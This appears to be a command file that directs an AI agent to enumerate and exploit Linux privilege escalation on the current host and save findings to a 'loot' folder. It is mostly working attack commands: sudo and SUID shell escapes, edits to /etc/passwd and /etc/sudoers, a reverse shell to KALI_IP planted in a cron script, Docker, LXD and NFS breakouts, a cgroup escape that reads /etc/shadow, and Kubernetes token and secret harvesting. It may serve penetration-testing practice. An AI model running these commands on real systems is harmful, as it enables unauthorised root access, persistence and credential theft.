Find Linux privilege escalation paths on the current host. $ARGUMENTS is optional context (hostname, OS version, current user). If no PEAS output is available, run manual enumeration commands first, then map each finding to the exact GTFObins/exploit command.

## Step 1: Manual enumeration (if no winPEAS/linPEAS output yet)
```bash
# Current user and privileges
id; whoami; sudo -l

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Writable cron jobs
crontab -l; ls -la /etc/cron*; cat /etc/crontab
ls -la /var/spool/cron/

# Writable files owned by root
find / -writable -user root -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null | head -20

# Environment / PATH
echo $PATH; env | grep -i pass

# Network services
ss -tulnp; netstat -tulnp 2>/dev/null

# NFS exports
cat /etc/exports 2>/dev/null

# Groups
groups; id

# Interesting files
find /home /root /opt /var /tmp -name "*.txt" -o -name "*.conf" -o -name "*.key" -o -name "*.pem" 2>/dev/null | head -20
cat /etc/passwd | grep -v nologin | grep -v false
ls -la /root/ 2>/dev/null

# Docker / LXD
groups | grep -E "docker|lxd"
docker ps 2>/dev/null
```

## Step 2: Map findings to exploitation

**Sudo NOPASSWD — map to exact GTFObins command:**
```bash
sudo vim -c ':!/bin/bash'
sudo python3 -c 'import os; os.system("/bin/bash")'
sudo find . -exec /bin/bash \; -quit
sudo awk 'BEGIN {system("/bin/bash")}'
sudo env /bin/bash
sudo less /etc/passwd    # then type: !/bin/bash
sudo cp /bin/bash /tmp/rootbash && sudo chmod +s /tmp/rootbash && /tmp/rootbash -p
sudo tee /etc/sudoers <<< "$(whoami) ALL=(ALL) NOPASSWD:ALL"
sudo perl -e 'exec "/bin/bash"'
sudo ruby -e 'exec "/bin/bash"'
sudo lua -e 'os.execute("/bin/bash")'
```

**SUID binary:**
```bash
# python/python3
python3 -c 'import os; os.execl("/bin/bash","bash","-p")'
# find
find . -exec /bin/bash -p \; -quit
# vim / vi
vim -c ':py3 import os; os.execl("/bin/bash","bash","-p")'
# bash (rare but beautiful)
bash -p
# cp — overwrite /etc/passwd or /etc/sudoers
cp /etc/passwd /tmp/passwd.bak
openssl passwd -1 -salt x hacked
sed 's/root:x/root:<HASH>/' /etc/passwd > /tmp/passwd
cp /tmp/passwd /etc/passwd
# nmap (old versions <5.2)
nmap --interactive  # then: !sh
```

**cap_setuid capability:**
```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
perl -e 'use POSIX; setuid(0); exec "/bin/bash";'
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```

**Writable cron script:**
```bash
# Append reverse shell
echo 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1' >> /path/to/cron_script.sh
# Start listener on Kali
nc -nvlp 4444
```

**Writable PATH component — hijack a root-run binary:**
```bash
# Identify what root runs that calls a relative binary name
# e.g. if /usr/local/bin is writable and root runs 'service':
echo '#!/bin/bash' > /usr/local/bin/service
echo 'chmod +s /bin/bash' >> /usr/local/bin/service
chmod +x /usr/local/bin/service
# Wait for cron/service restart, then:
bash -p
```

**NFS no_root_squash:**
```bash
# Kali:
showmount -e <TARGET>
sudo mount -t nfs <TARGET>:/share /mnt/nfs -o nolock
sudo cp /bin/bash /mnt/nfs/rootbash
sudo chmod +s /mnt/nfs/rootbash
# Target:
/mnt/share/rootbash -p
```

**Docker group:**
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# Or:
docker run -v /etc/sudoers:/mnt/sudoers --rm alpine sh -c \
  'echo "www-data ALL=(ALL) NOPASSWD:ALL" >> /mnt/sudoers'
```

**LXD group:**
```bash
# Kali: build alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder; sudo bash build-alpine
# Transfer image to target, then:
lxc image import ./alpine.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh
# Now: chroot /mnt/root /bin/sh → root
```

**Writable /etc/passwd:**
```bash
openssl passwd -1 -salt hack hacked123
echo 'hacker:$1$hack$<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker   # password: hacked123
```

**Kernel exploit (last resort):**
```bash
uname -a; cat /etc/os-release
searchsploit linux kernel <VERSION>
# Common: DirtyCow (3.x-4.x), Dirty Pipe (5.8-5.16), nf_tables (5.14+), PwnKit/pkexec
```

## Step 2b: Container / Kubernetes escape (am I in a container?)
```bash
# Detect container
cat /proc/1/cgroup | grep -iE "docker|lxc|kube"; ls -la /.dockerenv 2>/dev/null
cat /proc/self/status | grep CapEff        # decode caps: capsh --decode=<hex>
```
**Privileged container / dangerous caps (CAP_SYS_ADMIN):**
```bash
# cgroup release_agent escape (privileged)
d=$(dirname $(ls -x /s*/fs/c*/*/r* 2>/dev/null|head -1)); mkdir -p /tmp/c; echo 1 > $d/c/notify_on_release
host=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host/cmd" > $d/release_agent
echo '#!/bin/sh' > /cmd; echo "cat /etc/shadow > $host/out" >> /cmd; chmod +x /cmd
sh -c "echo 0 > $d/c/cgroup.procs"; cat /out
```
**Mounted Docker socket (`/var/run/docker.sock`):**
```bash
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
# no docker client? use curl against the socket API to create a privileged container
```
**runC / CVE-2024-21626** — leaked fd lets a crafted `WORKDIR`/process cwd escape to host FS; check runc version (`runc --version`), pull the PoC if < 1.1.12.
**Kubernetes service account:**
```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
kubectl --token=$TOKEN auth can-i --list
kubectl --token=$TOKEN get secrets -A            # hunt creds
kubectl --token=$TOKEN run x --image=alpine --overrides='{"spec":{"hostPID":true,"containers":[{"name":"x","image":"alpine","securityContext":{"privileged":true},"command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/sh"]}]}}' -it
```
Tools if allowed to pull: `deepce` (container enum), `CDK` (exploit toolkit), `amicontained`.

## Step 3: Output format
```
=== LINUX PRIVESC: <hostname> ===
[CRITICAL - exploit now]
  Finding: <name>
  Command: <exact one-liner>

[HIGH]
  Finding: <name>
  Command: <exact command>

PRIORITY: <ordered list>
```
Write to ~/osai/current/loot/<hostname>_privesc.md
